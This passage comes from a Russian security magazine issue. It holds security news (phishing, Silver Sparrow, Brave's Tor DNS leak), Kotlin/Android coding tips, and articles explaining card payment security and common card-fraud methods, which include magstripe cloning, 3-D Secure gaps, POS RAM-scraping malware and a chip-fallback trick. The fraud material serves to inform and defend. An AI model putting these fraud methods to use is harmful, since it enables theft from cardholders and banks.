  зователю сообщат, что время его сессии якобы истекло и нужно ввести
  пароль еще раз. Если пользователь поверит и введет свои данные в предос‐
  тавленную форму, они будут переданы на удаленный сайт, принадлежащий
  злоумышленникам. Издание отмечает, что для это го мошенники используют
  службу logo.clearbit.com (внедряет логотипы компаний‐получателей в форму
  для входа, чтобы сделать ее более убедительной). Если логотип недос тупен,
  используется общий логотип Oﬃce 365, как на скриншоте ниже.





  По информации издания, таким нап равлен ным атакам уже подверглись
   как минимум один надцать компаний, включая SGS, Dimensional, Metrohm, SBI
   (Mauritius) Ltd, NUOVO IMAIE, Bridgestone, Cargeas, ODDO BHF Asset Manage‐
   ment, Dea Capital, Equinti и Capital Four.


  30 000 ЗАРАЖЕННЫХ MAC

   Эксперты обнаружили вредонос Silver Sparrow, активный как минимум с лета прошлого года
   и уже заразивший 29 139 систем в 153 странах мира.

   Интересно, что специалисты пока не знают, как имен но рас пространяется Silver Sparrow. Веро‐
   ятно, он скрывается внутри вредоносной рекламы, в пиратских при ложе ниях или поддельных
   обновлениях Flash, то есть использует классичес кие векторы распространения Mac‐малвари.


   Отдельно подчеркивается, что Silver Sparrow может работать даже в системах с новым чипом
   Apple M1, и это делает его всего второй в истории угрозой, адаптированной для M1.





 BRAVE СЛИВАЛ
 ONION‐АДРЕСА
  Анонимный ИБ‐эксперт обна ружил, что браузер Brave, работающий в режиме
   Tor, оставлял следы в логах на DNS‐сервере: раскрывал URL‐адре са onion‐
  сайтов, которые посещал пользователь.
     Режим Tor был интегрирован в Brave еще в 2018 году, он позволя ет поль‐
  зователям посещать onion‐сайты. Это реализовано с помощью проксирова‐
  ния запросов пользователя через узлы  Tor, которые выполняют запрос
   к onion‐ресурсу вместо него, а затем передают обратно полученный HTML.
    Иссле дователь сообщил, что, когда браузер работает в режиме Private
  window with Tor, он переда ет на DNS‐сервер onion‐адреса любых посещаемых
  сайтов в формате стандартного DNS‐запроса (чего, разумеется, происходить
  не должно) Так, было про демонс трирова но, что «луковые» адре са DuckDuck‐
  Go и NY Times выполняли DNS‐запросы к локально настроенному DNS‐сер‐
  веру (общедоступным серверам Google по IP‐адресу 8.8.8.8).
     Впервые информация об этой проб леме была опубликована на Reddit,
  и сначала многие усомнились в корректнос ти выводов эксперта. Однако
  вскоре существование бага подтвердили такие известные ИБ‐специалисты,
   как главный исследователь PortSwigger Web Security Джеймс Кеттл (James
   Kettle) и аналитик CERT/CC Уилл Дорманн (Will Dormann).





  В итоге разработчики Brave сооб щили, что им известно о проблеме, и патч
  для нее был вклю чен в сборку Brave Nightly еще в середине февраля, пос ле
  получения сообщения об ошибке.
    Источником бага оказался встроенный в Brave блокировщик рекламы,
  который использовал DNS‐запросы для обнаружения сайтов, пытающихся
  обойти его запреты, но исключить домены .onion из этих проверок разработ‐
   чики попросту забыли.


  ДРУГИЕ ИНТЕРЕСНЫЕ СОБЫТИЯ МЕСЯЦА

  В коде LastPass для Android нашли семь встроенных трекеров


   Эксперты FireEye связали многочисленные взломы Accellion с хак‐группой FIN11


   Проект WACUP исправил мно жес тво багов в Winamp


   Специальная версия Flash для Китая превратилась в рекламную мал варь


   Google Apps Script используют, чтобы воровать данные бан ковских карт


  Обнаружена первая малварь для Apple M1


  Организация RIPE NCC сообщила о попытке взлома


   Нидерландская полиция разместила предупреждения для хакеров на хакерских форумах


  В Windows Defender исправили баг 12‐летней давности


   Украинские власти арестовали людей, связанных с шифровальщиком Egregor
HEADER
ANDROID

БЕЗОПАСНОСТЬ ANDROID 12
И ПРИНЦИП РАБОТЫ КОРУТИН





     Евгений Зобнин
  Редактор Unixoid и Mobile
        zobnin@glc.ru





Сегодня в выпус ке: security‐новшества Android 12, полез ные
и вредные функции‐расширения, советы по работе с Flow,
лучшее объяснение принципа работы корутин. А также под‐
борка библиотек для программистов.


                ПОЧИТАТЬ


Security-новшества Android 12
First preview of Android 12 — анонс Android 12, самая интересная часть которо‐
го — новые механизмы обеспечения безопасности.
 • Ужесточение правил расшаривания cookie в WebView. Вслед
   за Chromium WebView теперь использует более жесткие правила рас‐
  шаривания куков с атрибутом SameSite. В час тности, все куки с атри бутом
   SameSite=None обязаны иметь атрибут Secure и пересылаться по HTTPS,
   а ссылки между HTTP‐ и HTTPS‐версиями сайта теперь считаются cross‐
   site‐реквестами.
 • Ограниче ние доступа к MAC-адре су. Android 11 ограничил дос туп
   приложений к MAC‐адресу устройства, только если приложение име ет tar‐
   getSdkVersion 30, в Android 12 огра ничение рас пространяется на все при‐
   ложения.
 • Не экспортиру емые компонен ты по умол чанию. Для приложений,
   собранных для Android 12 (targetSdkVersion 31), все компоненты (активнос‐
   ти, провайдеры, сервисы) теперь автомати чес ки помечаются как неэк‐
   спортируемые. Поведение можно изменить с помощью атрибута android:‐
   exported=true. Этот атрибут обязателен для всех интент‐фильтров при‐
   ложения (иначе приложение прос то не уста новится на Android 12).
 • Бе зопасность PendingIntent. Приложения, собираемые с targetSdkVer‐
   sion  31, теперь обязаны помечать все PendingIntent как изме няемый
   или неизменяемый (PendingIntent.FLAG_MUTABLE, PendingIntent.
  FLAG_IMMUTABLE). PendingIntent используется в Android, чтобы позволить
   системе или сторонним приложениям передать интент от имени другого
   приложения.
 • Борьба с оверлеями.  Android 12 запрещает нажимать элементы
   интерфейса сквозь непрозрачные оверлеи (окна, показы ваемые поверх
   всех приложений) за несколькими исключени ями: окна ассистентов,
  помощников для людей с огра ниченными возможностями и экранных кла‐
   виатур.
 • Запрет на запуск foreground-сервисов в фоне. Приложения, соб‐
   ранные с targetSdkVersion 31, не смогут запус кать foreground‐сервисы
   в фоне.
 • Запрет  на  зак рытие  системных диало гов.  Интент ACTION_
  CLOSE_SYSTEM_DIALOGS объявлен уста ревшим и больше не работает.


              РАЗРАБОТЧИКУ


Полезные функции-расширения
5 Kotlin Extensions To Make Your Android Code More Expressive — очередная
статья о том, как сделать код на Kotlin вырази тельнее с помощью фун‐
кций‐расширений.
 1. Функции для показа и скрытия элементов интерфейса:


   fun View.show(){
     this.visibility = View.VISIBLE
   }


   fun View.hide() {
     this.visibility = View.INVISIBLE
   }


   fun View.remove(){
     this.visibility = View.GONE
   }

 2. Функции валидации строк:


   fun String?.valid(): Boolean = this != null && !this.equals("null"
   , true) && this.trim().isNotEmpty()


   fun String.isValidEmail(): Boolean = this.isNotEmpty() && Patterns
   .EMAIL_ADDRESS.matcher(this).matches()


   fun String.formatPhoneNumber(context: Context, region: String):
   String? {
     val phoneNumberKit = PhoneNumberUtil.createInstance(context)
     val number = phoneNumberKit.parse(this, region)
     if (!phoneNumberKit.isValidNumber(number))
       return null


     return phoneNumberKit.format(number, PhoneNumberUtil.
   PhoneNumberFormat.INTERNATIONAL)

 3. Функции для работы с бандлами:


   inline fun <reified T: Any> Activity.getValue(lable: String,
   defaultvalue: T? = null) = lazy{
     val value = intent?.extras?.get(lable)
     if (value is T) value else defaultvalue
   }


   inline fun <reified T: Any> Activity.getValueNonNull(lable: String
   , defaultvalue: T? = null) = lazy{
     val value = intent?.extras?.get(lable)
     requireNotNull((if (value is T) value else defaultvalue)){lable}
   }


   inline fun <reified T: Any> Fragment.getValue(lable: String,
   defaultvalue: T? = null) = lazy {
     val value = arguments?.get(lable)
     if (value is T) value else defaultvalue
   }


   inline fun <reified T: Any> Fragment.getValueNonNull(lable: String
   , defaultvalue: T? = null) = lazy {
     val value = arguments?.get(lable)
     requireNotNull(if (value is T) value else defaultvalue) { lable
   }
   }

 4. Функции для извлечения ресурсов:


   fun Int.asColor() = ContextCompat.getColor(ApplicationCalss.
   instance, this)
   fun Int.asDrawable() = ContextCompat.getDrawable(MavrikApplication
   .instance, this)

 5. Показ диалогов и сооб щений:


   fun Context.showAlertDialog(positiveButtonLable: String =
   getString(R.string.okay), title: String = getString(R.string.
   app_name), message: String, actionOnPositveButton: () ‐> Unit) {
     val builder = AlertDialog.Builder(this)
       .setTitle(title)
       .setMessage(message)
       .setCancelable(false)
       .setPositiveButton(positiveButtonLable) { dialog, id ‐>
         dialog.cancel()
         actionOnPositveButton()
       }
     val alert = builder.create()
     alert?.show()
   }


   fun Context.showShotToast(message: String){
     Toast.makeText(this, message, Toast.LENGTH_SHORT).show()
   }


   fun Context.showLongToast(message: String){
     Toast.makeText(this, message, Toast.LENGTH_LONG).show()
   }


   fun View.showShotSnackbar(message: String){
     Snackbar.make(this, message, Snackbar.LENGTH_SHORT).show()
   }


   fun View.showLongSnackbar(message: String){
     Snackbar.make(this, message, Snackbar.LENGTH_LONG).show()
   }


   fun View.snackBarWithAction(message: String, actionlable: String,
   block: () ‐> Unit){
     Snackbar.make(this, message, Snackbar.LENGTH_LONG)
       .setAction(actionlable) {
         block()
       }
   }


Вредные функции-расширения
Bad Kotlin Extensions — статья о том, как не надо писать функции‐расширения
на Kotlin. Большая часть текста основана на стандартных правилах соз дания
функций: функция не должна делать больше, чем заявлено в ее названии;
функция должна иметь четкое имя, которое на 100% однозначно отражает ее
суть, и так далее. Но есть и несколько весь ма интересных примеров:


operator fun Int.not(): Int {
    return factorial(this)
}

Эта функция‐расширение поз воляет счи тать факториал с помощью такой
записи:


!5

Она весьма похожа на запись 5!, которая используется для расчета фактори‐
ала в математике. Однако в данном случае такая форма, конечно же, будет
сбивать с толку, так как в языках программирова ния восклицательный знак
почти всегда означает отрицание.
  Еще один интересный пример:


operator File.div(fileName: String): File = File(this, fileName)

Данная функция позволяет делать так:


val file = File("src") / "main" / "java" / "com"

Выглядит классно, но пользы тут не так уж и мно го, а оверхед от создания
четырех объектов высокий.


Лучший способ сбора данных из Flow
The Best Way to Collect a Flow in Kotlin — launchIn — небольшая заметка
о неочевидных моментах Kotlin Flow API и функции launchIn.
  Представим, что нам необ ходимо собрать данные из Flow. Способ сде‐
лать это «в лоб» выглядел бы так:


scope.launch {
  flow
    .onEach { println(it) }
    .collect()
}

Однако «каноничный» спо соб будет другим:


flow
  .onEach { println(it) }
  .launchIn(scope)

И это не просто синтаксичес кий сахар. LaunchIn позволя ет избежать весьма
неочевидных проблем с приложением.
  К примеру, когда нуж но соб рать данные из двух Flow, легко ошибиться
и сделать это так:


scope.launch {
  flow1
    .onEach { println(it) }
    .collect()


  flow2
    .onEach { println(it) }
    .collect()
}

Ошибка здесь в том, что данные из двух Flow не будут собираться одновре‐
менно. Сначала будут получены все данные из flow1, и только затем начнется
сбор flow2.
  Исправить это неканоничным путем можно так:


scope.launch {
  flow1
    .collect { println(it) }
}
scope.launch {
  flow2
    .collect { println(it) }
}

Однако при использовании launchIn такого не воз никнет в прин ципе:


flow1
  .onEach { println(it) }
  .launchIn(coroutineScope)
flow2
  .onEach { println(it) }
  .launchIn(coroutineScope)


Как работают корутины
Lets build a coroutine — хорошая статья, объясня ющая на пальцах, как работа‐
ют корутины в Kotlin и других языках.
   Разработчики Kotlin называют корутины легковес ными потоками. Однако
такое объяснение не помога ет понять их сути и даже мешает этому. На самом
же деле корутины довольно прос тая, но мало похожая на потоки концепция.
   Чтобы разобраться с корутинами (coroutine), надо понять, что такое rou‐
tine. А это не что иное, как функция. Например, такая:


fun saveUserTasks(userId: Int) {
  val user = loadUser(userId)
  println("user loaded")


  val tasks = loadTasks(user)
  println("tasks loaded")


  saveTasks(tasks)
}

Две отличительные черты функций:
 • они не имеют состояния и всегда запускаются «с чистого лис та» (если,
   конечно, не исполь зуют глобальные переменные);
 • функция должна завершить свое исполнение, перед тем как вернуть
   управление вызвавшему ее коду.

Корутина, с другой стороны, имеет состояние и может приостанавливать
и возобновлять свое исполнение в определенных точках (возвращая, таким
образом, управление еще до завершения своего исполнения).
   Если мы попробуем вручную преобра зовать приведенную выше функцию
в корутину, то получим нечто вроде этого:


class State(
  var label: Int = 0,
  var result: Any? = null
)


fun saveUserTasks(userId: Int, state: State) {
  when (state.label) {
    0 ‐> {
      val user = loadUser(userId)
      println("user loaded")
      state.result = user
      // Точка остановки исполнения
    }


    1 ‐> {
      // Точка возобновления исполнения
      val user = state.result as User
      val tasks = loadTasks(user)
      println("tasks loaded")
      state.result = tasks
      // Точка остановки исполнения
    }


    2 ‐> {
      // Точка возобновления исполнения
      val tasks = state.result as List<Task>
      saveTasks(tasks)
    }
  }
}

Теперь мы можем запус тить нашу доморощенную «корутину» на выполнение
с помощью такого кода:


fun main() {
  val state = State()
  saveUserTasks(7, state)
  saveUserTasks(7, state)
  saveUserTasks(7, state)
}

Результат будет тот же, что и в случае приведенной в начале классичес кой
функции. Но теперь у нас появилась воз можность запускать и приостанав‐
ливать исполне ние функции в нескольких точках. Если мы добавим сюда
еще несколько подоб ных корутин, то сможем выполнять их фрагменты пооче‐
редно, создав иллюзию одновременного исполнения.
  Именно  так  работают  корутины  в  Kotlin. Он  превращает функции
с модификатором suspend в объект класса Continuation, который внутри
представ ляет собой примерно такую же машину состояний, которую мы
изобрели чуть выше. Точки оста новки при этом появляются в местах вызова
других suspend‐функций.


              БИБЛИОТЕКИ


 • Karavel — библиотека навигации для Jetpack Compose;
 • Baloon — библиотека, поз воляющая соз давать всплывающие подсказки
   для элементов интерфейса;
 • Multik — официальная библиотека Kotlin для работы с многомерными мас‐
   сивами;
 • Linkt — библиотека для работы с глубокими ссылками (deep link);
 • Bouncy — анимация оверс крол ла в стиле iOS для RecyclerView;
 • GaugeProgressView — очередной круговой прог ресс‐бар.
COVERSTORY
БЛИЗКИЕ
КОНТАКТЫ

РАЗБИРАЕМСЯ, КАК РАБОТАЮТ
СИСТЕМЫ БЕЗОПАСНОСТИ
КРЕДИТНЫХ КАРТ





     Тимур Юнусов





В твоем кошельке наверняка есть несколько карт меж‐
дународных платежных систем, таких как Visa или Master‐
Card. Задумывался ли ты, какие алго ритмы используются
в этих картах? Насколько платежи безопасны? Мы распла‐
чиваемся картами каждый день, но достоверно знаем о них
крайне мало. Еще больше мифов сопровождает карточные
платежи. Чтобы понять, какие есть способы похитить деньги
с карты, нужно сначала уяснить, как происходит оплата.
Давай разбираться вместе.


НОМЕР КАРТЫ
Оплата по номеру карты историчес ки — самая старшая. Раньше на картах
не было ничего, кроме это го номера. Номер был «эмбоссирован» — выдав‐
лен на карте. При оплате карта «прокатывалась» на специальном устройстве,
что позволяло продавцу быс тро внести номер в древнюю замену базы дан‐
ных, то есть отпечатать на листе бумаги.
  В конце рабоче го дня или недели эти данные собирались и передавались
в банк‐эквайер. Далее банк отправлял запросы на списание этих денег у вла‐
дельцев карт через банки‐эмитенты. Это было так давно, что немного людей
знают, откуда появился трехзначный код верификации платежей, записанный
на обратной стороне карты, так называ емый CVV2/CVC2. До нас дошла
информация, что этот код использовался скорее как контрольная сумма, нуж‐
ная, чтобы владелец карты не ошибся и корректно ввел всю информацию
при оплате. Похоже на правду, если учесть, нас коль ко короткий этот код.
  Сейчас физическая карта может и вовсе не учас твовать в оплате.
Это называется card not present и чаще всего используется при оплате
в интернете. Если номер карты вводится при оплате в платежном терминале,
а это характерно для отелей, бизнесов, ведущих дела по телефону, а также
для большинства терминалов в США, такой подтип платежей называется PAN
Key Entry.
  Многие до сих пор считают, что поле Cardholder name с лицевой стороны
карты нужно вводить корректно и что оно проверяется. Это не так — ни один
банк не проверяет это поле.


МАГНИТНАЯ ПОЛОСА
Операции с магнитной полосой — один из самых простых методов. Он ассо‐
циируется у людей с определенными типами мошенничества. Скимминг
в банкоматах, двой ные сня тия в рес торанах — все это возможно благодаря
недостаткам магнитной полосы. Магнитную полосу легко скопировать —
для этого необходим толь ко специальный ридер/энкодер магнитной полосы.
Дальше клонированной магнитной полосы достаточно для того, чтобы рас‐
плачиваться в большинс тве супермаркетов мира. Для верификации владель‐
ца карты предполагалось использовать подпись на чеке, которую кас сир дол‐
жен сверить с подписью на обратной стороне карты.





На картинке выше ты видишь пример записанной на карту информации. Чер‐
ные полоски — это единицы, белые — нули. Существуют open source
решения для декодирования этих данных — к примеру, magstripe.
  На самом деле по изоб ражению видно, что на карте не одна, а целых две
магнитные полосы разной плотности (Track1 и Track2). Какие данные содер‐
жатся на магнитной полосе?
 • Номер карты, дата окончания действия, имя владельца карты — все, что
   физически отпечатано на лицевой стороне карты.
 • Сервисный код — три цифры, которые помогают взаимодействующему
   с картой устрой ству (терминал или банкомат) понять, какие функции есть
   у карты, а каких нет. Можно ли использовать эту карту в банкомате, осна‐
  щена ли карта чипом.
 • Код верификации (CVV, CVC, CID — терминоло гия зависит от платежной
   системы) — код, ана логичный тому, что написан на обратной стороне кар‐
   ты. Он рассчитывается по алгорит му криптогра фической чек‐суммы (MDK
  MAC) с помощью 128‐битного ключа от информа ции, записанной на маг‐
   нитной полосе. Использование вычисляемого CVV вмес то случайного
   помогает от атак, когда, например, злоумышленник подменя ет сервисный
   код и пытается убедить пла тежный терминал, что карта не оснащена
   чипом. Банк‐эмитент получит данные магнитной полосы, сверит их, и кон‐
   трольная сумма не сойдет ся с переданным значением в поле CVV. Сверки
   проходят в защищенном хранилище ключей — так называемом HSM (hard‐
   ware secure module).


ЧИП/EMV
На смену магнитной полосе в девянос тых приш ли смарт‐карты, для популя‐
ризации которых создали консорциум EMV (Europay, MasterCard, Visa). Прод‐
вигаемая  консорциумом  идея  была  проста:  используя  особенности
смарт‐карт, симметричную криптографию и крип тографию с открытым клю‐
чом, решить все проб лемы, свя занные с магнитной полосой. Операции
со смарт‐картой обеспечивают три степени защиты:
 1. Аутентификация карты. Проверка платеж ным терминалом того, что карта
   подлинная и действительно была выпущена банком N, а не была создана
   злоумышленниками в домашних условиях.
 2. Верификация плательщика. Проверка того, что эта карта принадлежит
   покупателю, стояще му перед платежным терминалом.
 3. Авторизация транзакции. От карты до банка‐эмитента путь долгий. Банк
   должен убедиться, что данные операции нигде не были искажены зло‐
  умышленниками. Что сумма осталась неизменной, что дата операции кор‐
   ректная, что эта операция уникальна, а не была уже проведена в прошлом
   месяце.

Давай пройдемся по используемым методам.


Аутентификация карты
Для аутентификации карты использует ся криптогра фия с откры тым ключом
по протоколу RSA. Текущие минимальные требования по длине ключа —
1024 бита. Ограниченное число центров сертификации выпускают ключи
для банков, а банки их уже привязывают к самим картам. Приватный ключ хра‐
нится на самой смарт‐карте в области, недос тупной для чте ния. Корневые
сертификаты устанавлива ются на терминал при его настрой ке. Во вре мя
транзакции карта предоставляет публичные клю чи платежному терминалу
вместе с информацией, зашифрованной приватным ключом в режиме циф‐
ровой подписи. Если публичный ключ доверенный и информация, переданная
картой, успешно расшифровывается этим ключом, то терминал счи тает карту
аутентичной, выпущенной именно тем банком, который подписал приватный
ключ, выданный центром сертифика ции.
  Всего существует три режима аутентификации карты:
 • SDA — static data authentication;
 • DDA — dynamic data authentication;
 • CDA — combined dynamic data authentication.

В первом методе исполь зовалось толь ко одно статическое поле, хранящееся
на карте. Оно подписывалось приватным ключом и проверялось терминалом.
Это было EMV‐поле AIP (application interchange proﬁle). Но консорциум EMV
быстро понял, что для популярных в то время офлайновых терминалов (они
не выходили в онлайн для сверки криптограммы) этого было явно недос‐
таточно — любой мог клонировать публичный ключ и подписанную статичес‐
кую строку, чтобы создать подделку.
  Следующий метод полагался на динами чес кие данные, приходящие
от терминала. Терминал генерирует поле UN — Unique Number, которое под‐
                                                               32писывается приватным ключом карты. Энтро пия этого поля — 2   , чего дос‐
таточно для защиты от первой ата ки.
  Однако в 2009 году исследователи из Кембриджского университета пред‐
ставили работу, описывающую так называемую атаку PIN OK  (PDF). Спе‐
циальное устройство, рас полага ющееся меж ду картой и терминалом, совер‐
шало атаку «человек посередине» и подменяло одно из полей, которые
отправляла карта. Эту подмену нельзя было обнаружить на терминале
с помощью описанных выше методов. Для защиты от таких атак консорциум
EMV еще до  находки  исследователей предус мотрел новый механизм
защиты — схему CDA. Во время нее терминал может проверить целос тность
большинства полей, которые переда ет карта и которые участву ют в фазе
под названием «риск‐менеджмент».
  Офлайновая аутентификация соз давалась в первую очередь для защиты
офлайновых платежей, когда терминал не подклю чен к интернету постоянно.
Именно поэтому, если результат работы режимов DDA или CDA не заканчива‐
ется успехом, в современных терминалах, подклю ченных к интерне ту, это не
приведет к отказу транзакции в 99% случаев, так как банк‐эмитент авторизует
ее с помощью криптограммы, как описано ниже. Однако некоторые платеж‐
ные системы рекомендуют обращать внимание на постоянные неуспешные
аутентификации, особенно если они про исходят в раз ных терминалах.


Верификация плательщика
Есть два основных способа верификация плательщика: ПИН‐код и подпись.
На самом деле их немного больше — ПИН‐код может проверяться в офлайне
(на самой карте) и онлайн. Он может быть зашифрован (с помощью сим‐
метричного ключа 3DES) или передаваться в откры том виде.
  Еще возможен способ верификации NoCVM — то есть отсутствие верифи‐
кации. Хороший пример таких операций —  те, которые не превышают
лимиты 3000 рублей и не требуют вво да ПИН‐кода. Их иногда называют Tap &
Go.
  Другой способ, который в зависимос ти от платежной сис темы называется
CDCVM или On‐Device CVM, делает возможной верификацию на мобильном
телефоне владельца карты. Как ты уже догадал ся, он используется в Google
Pay и Apple Pay.


Авторизация транзакции
Для авторизации транзакции смарт‐карты соз дают платежную криптограмму.
Карта отправляет терминалу список полей — их набор зависит от версии
криптограммы и настроек карты. Как пра вило, это сумма опе рации, валюта,
дата и другие важные для этапа риск‐менеджмента настройки терминала.
Далее карта допол няет эти поля своими внутренними полями: счетчик опе‐
раций, версия криптограммы.
  Полученная строка шифрует ся с помощью записанного на карте сек‐
ретного ключа 3DES в режиме цифровой подписи и передается банку вместе
со всей подписанной информа цией. Банк‐эмитент использует аппаратный
модуль  безопасности  (hardware  security  module,  HSM),  на  котором
в защищенной от чтения области памяти содержится копия симметричного
клю ча карты.
  HSM также создает цифровую подпись по данным от платежного тер‐
минала. Если он получит такую же криптограмму, то транзакция будет счи‐
таться авторизо ванной. Это зна чит, что никто не подменил данные операции
во время их передачи от карты до банка эмитента. На этом же этапе рас‐
шифровывается и сверяется ПИН‐код карты, в случае если используется
онлайн‐сверка ПИН.
  Обрати внимание, что все эти три функции работа ют хорошо только вмес‐
те. Чтобы корректно работала верификация, она должна контролироваться
с помощью аутентификации. Если нет авторизации — вся транзакция ста‐
новится высокорисковой, и так далее.


БЕСКОНТАКТНЫЕ ПЛАТЕЖИ
Бесконтактные платежи ста ли набирать популярность с середины 2010‐х
годов. Банки и платежные системы продвигают их как быс трый и удобный
способ оплаты. Оно и понят но — чем больше народ платит картами, тем
больше можно зарабо тать на комиссиях! С раз витием технологий нужно раз‐
вивать и безопасность, но это далеко не всег да так. И бесконтактные платежи
как раз пример из неудачных.
   Когда создавались бесконтактные платежи, карты с чипом в США еще не
были особенно распространены, поэтому Visa и MasterCard пре дусмотрели
промежуточный шаг, ког да новыми бесконтактны ми картами можно платить
на старых несовременных платежных терминалах, которые не поддерживают
современную криптогра фию. Этот шаг называется Legacy modes — режимы,
степень безопасности которых значительно ниже, чем у платежей EMV и сов‐
ременных форм бесконтактных платежей.
   Legacy modes по степени защиты больше напоминают операции с маг‐
нитной полосой, только проводятся через NFC. Нес мотря на то что эти
режимы предполагалось использовать лишь в нес кольких странах, а через
какое‐то время и вовсе отменить, мы в 2020 году встречаем их повсемес‐
тно — в том числе в Рос сии, где даже магнитная полоса запрещена.
  Отдельная проб лема — это то, как платежные сис темы подошли к реали‐
зации бесконтактных платежей. Вмес то того чтобы при думать что‐то новое,
в компаниях Visa и MasterCard решили и здесь использовать EMV, но каждая
сделала это по‐своему, так что де‐юре они перес тали быть частью стандарта
EMV.


             INFO

                       Что из этого следует:
                  •Во‐первых, механиз мы защиты и их проблемы,
                        описан ные в начале 2000‐х годов, сохранились.
                    В большинстве карт даже крип тографические
                       ключи, используемые для крип тограмм EMV
                       и NFC, одни и те же.
                  •Во‐вто рых, ассо циация EMV не могла больше
                         влиять на то, как будет построен платежный
                        процесс.


В компании Visa были недовольны слишком долгим вре менем проведения
платежа. Когда для этого использовался чип, проб лем не было — карта
вставлялась в тер минал. Однако в Visa посчитали, что держать карту у тер‐
минала, ожидая, пока пройдут все шаги EMV, — это не очень‐то удобно. Этап,
который вызывал основную задержку, — это офлайновая аутентификация
карты.
  Одновременно с этим в MasterCard при няли диаметрально противополож‐
ное решение — признали, что офлайновая аутентификация важна и для тех
карт, которые поддерживают наибо лее безопасную схе му аутентификации
CDA, и сделали ее обязательной. В спецификации EMV, если взаимодействие
по схеме CDA не заканчивается успешно, терминал все еще может отправить
криптограмму для онлайновой авторизации. Тогда как для бес контактных пла‐
тежей MasterCard неудачная аутентификация CDA всегда ведет к отмене пла‐
тежа. Разница во времени операций незначительная, однако это остается
решающим фактором для Visa.


ВЫВОДЫ
Теперь, когда ты знаешь, как работают элек тронные и в том числе бесконтак‐
тные платежи, ты готов к разговору об уяз вимос тях в этих схемах. Это мы
обсудим в следующих статьях, а заодно раз берем самые громкие кейсы
мошенничества.
COVERSTORY
БЛИЗКИЕ
КОНТАКТЫ

КАК ХАКЕРЫ КРАДУТ ДЕНЬГИ
С БАНКОВСКИХ КАРТ





       Тимур Юнусов





Сетевые мошенники и кардеры изобретают все новые
и новые способы похищать деньги со счетов клиентов бан‐
ков. В этой статье я расскажу о методах, которые преступни‐
ки используют для обхода системы безопасности банков‐
ских карт.


             INFO

                 О том, как работают сами системы безопасности
                          карт, ты можешь узнать из предыдущей статьи.


Все способы мошен ничес тва с банковскими картами можно разделить на две
категории. Первая — массовые и хорошо известные. Вторую часто называют
«белыми китами»: это инциденты, которые случаются раз в 5–10 лет, закан‐
чиваются  катастрофой для атакуемых и мно гомиллионными прибылями
для атакующих и поэтому привлека ют к себе очень много внимания со сто‐
роны прессы и регуляторов. В любом случае основной критерий успе ха у кар‐
деров и им подоб ных жуликов — массовость и простота. Если мошенничес‐
кую схему легко воспро извести тысячи раз — это залог финансовой победы
над банковской системой и гря дущей популярности выбранного метода.


САМЫЕ РАСПРОСТРАНЕННЫЕ ТИПЫ МОШЕННИЧЕСТВА
Начнем с атак, с которыми платежным системам и банкам приходится иметь
дело регулярно.


Платежи без 3-D Secure
Первое место по распространенности среди мошеннических схем занимают
платежи в интернете — они совершаются по схеме card‐not‐present. В связи
с их массовостью платежные гиганты изоб рели дополнительный динамичес‐
кий фактор – код 3‐D Secure.


Что такое 3-D Secure
3‐D Secure — схема дополнительной авторизации онлайновых платежей,
использующая три сущности‐домена (отсюда и наз вание 3‐Domain Secure):
домен интернет‐магазина принимает данные об опла те и пере адре совывает
пользователя на домен платежной системы, где вво дится одноразовый код.
Далее результат отправляется на третий домен банка‐эквайера, он сверяет
этот код и отправляет запрос, который подтверждает или опровергает тран‐
закцию обратно по цепочке интернет‐магазину.


3‐D Secure отлично помога ет от мас совых мошенничес ких схем. Однако
часть магазинов, в том числе крупных, таких как «Амазон», до сих пор
не готова работать с 3‐D Secure, который, по их мнению, уменьшает кон‐
версию. А международные платежные системы и не настаивают! Лучше тра‐
тить больше — это их девиз. Текущие пра вила пла тежей гласят, что, если кар‐
та поддерживает 3‐D Secure, а магазин эту технологию не поддерживает,
в случае опротестования платежа финансовые риски лежат на магазине.
Если 3‐D Secure не поддерживает карта — на банке‐эмитенте. Поэтому
по всему миру голодные мошенники ищут магази ны, которые не требуют 3‐D
Secure.
   Иногда это можно воспринимать буквально: в 2018 году в Великобритании
выявили одну  из мошенничес ких  схем. Злоумыш ленники опубликовали
в социальных сетях объ явления о пятидесятипроцентной скидке на доставку
пиццы одного крупного бренда. Этот бренд не использовал при оплате 3‐D
Secure, и платежи выполнялись по куп ленным на различных маркетах укра‐
денным картам. Это давало зло умышленникам выручку в 50% от суммы каж‐
дой проданной пиццы. Схема прорабо тала несколько месяцев, прежде чем
ее прикрыли.


Атака клонов
Второй по популярности вид мошенничес тва — соз дание клона магнитной
полосы карты. Он до сих пор остается одним из самых распространенных
методов атак на операции с физической картой (так называемые card‐present
transactions). Как ты знаешь, магнитную полосу чрезвычайно прос то клониро‐
вать.
  К отдельным видам киберпреступлений стоит отнести использование спе‐
циализированного вредонос ного ПО. Атака дол жна быть легко повторя ема
и хорошо масштабируема. Именно поэтому злоумышленники заражают
устройства, на которых используются тысячи карт каждый день, — оператор‐
ские машины в крупных супермаркетах.


             INFO

                        Так как вся инфраструк тура, использующая пла‐
                       тежный терминал (POS, Point‐of‐Sale), называ‐
                        ется POS system, то и разновидность этих вре‐
                      доносов носит название POS malware, несмотря
                       на то что сами POS они заражать не в состоянии.
                    Вместо это го атаке подвергается сама оператор‐
                        ская машина — кассовый аппарат (cash register).


В 2013 году американская сеть магазинов Target подверглась крупнейшей
атаке. В ней преступники использовали еще не особенно популярную тогда
схему «компрометация цепочки поставки». После зараже ния одного из под‐
рядчиков злоумышленникам уда лось про никнуть в сеть супермаркетов, ском‐
прометировать весь домен Windows и проникнуть в опе рационную систему
непосредственно на кас сах. На этих системах запускались так называемые
RAM‐scraping‐трояны, которые ска нировали память в поис ках паттернов тре‐
ков магнитной полосы. Когда треки обна руживались, троян пересы лал их
на установленный во внут ренней сети C&C‐сервер, который дальше уже
отправлял эту информацию во внеш нюю сеть.


             INFO

                     Для создания копии магнитной бан ковской карты
                        потребуется несколько секунд и специальный
                       ридер, купить который можно на Amazon. Далее
                       злоумышленники создают клон и идут с ним
                        в магазины в Америке или Европе. Дампы бан‐
                        ковских карт свободно продаются и покупа ются
                       на многочисленных хакерских форумах.


Почему же клонированные магнитные карты до сих пор так популярны, нес‐
мотря на то что практичес ки все они сей час оснащены чипом? Все проще
простого: во многих американских магази нах до сих пор можно рас платиться
картой, оснащен ной чипом, просто проведя транзакцию с использованием
магнитной полосы. В пос ледние 5–10 лет это, как ни странно, самый отста‐
лый рынок, из‐за которого маг нитная полоса до сих пор присутствует на бан‐
ковских картах.
   Если же платежный тер минал вдруг откажет ся принимать магнитную
полосу сразу, есть схема, работа ющая в обеих Америках и Европе, — techni‐
cal fallback. Эта техника заключа ется в том, что злоумышленник трижды встав‐
ляет в банкомат или терминал карту с несуществу ющим чипом и после треть‐
